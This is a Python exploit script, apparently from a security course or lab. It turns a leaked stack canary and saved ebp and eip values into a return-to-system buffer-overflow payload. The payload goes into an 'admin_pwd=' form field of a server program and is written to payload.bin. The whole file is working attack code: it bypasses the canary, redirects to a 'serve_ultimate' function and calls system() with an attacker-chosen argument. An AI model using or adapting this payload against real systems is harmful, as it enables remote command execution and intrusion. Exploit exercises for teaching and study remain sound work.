import os
import sys

# function to replace all null bytes (0x0) with value 0x26 (&)


def replace_null_bytes(word):
    dangerous = []
    prev = '1'
    for i in range(0, len(word)):
        if i % 2 == 1 and word[i] == '0' and prev == '0':
            dangerous.append(i-1)
            prev = '1'
        else:
            prev = word[i]

    neww = list(word)
    for i in dangerous:
        neww[i] = '2'
        neww[i+1] = '6'  # 0x26 == '&'

    s = ''
    for i in neww:
        s += i
    return s


# function to reverse a word
def reverse_word(word):
    return ''.join([word[i:i+2] for i in range(0, len(word), 2)][::-1])

# transform a hex-word


def transform_word(word):
    return reverse_word(replace_null_bytes(word))  # truncate the '0x' part


# function to create the payload in bytes
def get_payload(useful_words, base_address):
    # the stack is assigned like this
    # TOP TO BOTTOM : <canary><idc><idc><ebp><return address - saved eip>
    payload_words = [transform_word(
        base_address)]*12 + list(map(transform_word, useful_words))
    # print(payload_words)
    payload = b''
    for w in payload_words:
        payload += bytes.fromhex(w)
    return 2 * b'\xBB' + payload


# main function
if __name__ == '__main__':
    # the first argument is the hex bytes we printed using the exploit of step 2
    # we will need only the last 6 addresses since they containt what we need
    useful_words = sys.argv[1].split()[-5:]

    fixed_point = int(useful_words[-1], 16)
    canary = useful_words[0]
    saved_ebp = int(useful_words[-2], 16)

    print("Saved $ebp: {}, Saved $eip : {}, Canary: {}".format(
        useful_words[-2], useful_words[-1], useful_words[0]))

    trg_offset, base_offset, system_offset = map(int, sys.argv[2:5])
    print('serve_ultimate offset : {} base offset: {}, system offset: {}'.format(
        trg_offset, base_offset, system_offset))

    # get the target point (serve_ultimate address)
    target_point = hex(fixed_point + trg_offset)[2:]
    useful_words[-1] = target_point
    base_address = hex(saved_ebp - base_offset)[2:]
    print('serve_ultimate address: {}, post_data address: {}'.format(
        target_point, base_address))

    # Now we have to contruct the payload (this is the same payload as step 3)
    payload = get_payload(useful_words, base_address)

    # we will have to re-set the saved return value for the serve_ultimate function
    ret_to_system = bytes.fromhex(transform_word(
        hex(int(useful_words[1], 16) + system_offset)[2:]))

    # add a fake eip
    fake_eip = b'SEXY'  # add some swag man # XD
    # estimate the byte-length between the start of post_data's arg and start of system's arg
    till_argument = 10 + len(payload) + 4*3
    system_arg_offset = bytes.fromhex(transform_word(
        hex(saved_ebp - base_offset + till_argument)[2:]))

    # save to a variable the byte-transformed version of the path you want to get from the server
    system_arg = bytes(sys.argv[5], 'utf-8')

    print('system address: {},  system argument address: {}'.format(hex(int(
        useful_words[1], 16) + system_offset)[2:], hex(saved_ebp - base_offset + till_argument)[2:]))

    # get the full payload in a variable
    full_payload = b'admin_pwd=' + payload + ret_to_system + fake_eip + \
        system_arg_offset + system_arg  # 10 + 68 + 4 + 4 + 4 + len(arg)

    # write the payload into a file
    with open("payload.bin", "wb") as f:
        f.write(full_payload)

    # print what we will get
    print('\nFinal payload:\n {}'.format(full_payload))
else:
    print("Must run as main script.")
